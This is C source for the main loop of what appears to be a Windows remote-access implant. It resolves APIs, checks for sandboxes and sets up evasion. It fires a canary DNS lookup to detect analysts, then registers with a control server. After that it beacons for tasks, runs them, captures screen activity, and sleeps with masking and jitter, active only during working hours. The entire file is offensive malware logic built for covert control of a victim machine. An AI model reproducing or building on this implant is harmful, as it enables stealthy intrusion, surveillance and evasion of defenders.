/* winsock2.h must precede windows.h to avoid winsock.h conflicts */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "config.h"
#include "transport.h"
#include "commands.h"
#include "evasion.h"
#include "api_resolve.h"
#include "dotnet.h"

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // Child process mode for DOTNET_EXEC fork-and-run.
    if (GetEnvironmentVariableA("__ENDGAME_CLR_CHILD", NULL, 0) > 0) {
        clr_child_run();
        ExitProcess(0);
    }

    api_init();
    sandbox_check();
    evasion_init();

    /* Canary DNS lookup — triggers server-side burn detection if this binary
     * is sandbox-analyzed before it registers. Fire-and-forget. */
    if (AGENT_CANARY_DOMAIN[0] != '\0') {
        WSADATA wsa = {0};
        if (WSAStartup(MAKEWORD(2,2), &wsa) == 0) {
            struct addrinfo hints = {0}, *res = NULL;
            getaddrinfo("canary." AGENT_CANARY_DOMAIN, NULL, &hints, &res);
            if (res) freeaddrinfo(res);
        }
    }

    while (!agent_register()) {
        sleep_masked(30000);
    }

    for (;;) {
        if (!in_working_hours()) {
            sleep_until_work_hours();
            continue;
        }
        int count = 0;
        AgentTask *tasks = agent_beacon(&count);
        for (int i = 0; i < count; i++) {
            dispatch_task(&tasks[i]);
        }
        tasks_free(tasks, count);
        screenwatch_tick();
        sleep_masked(sleep_ms_jitter());
    }
}
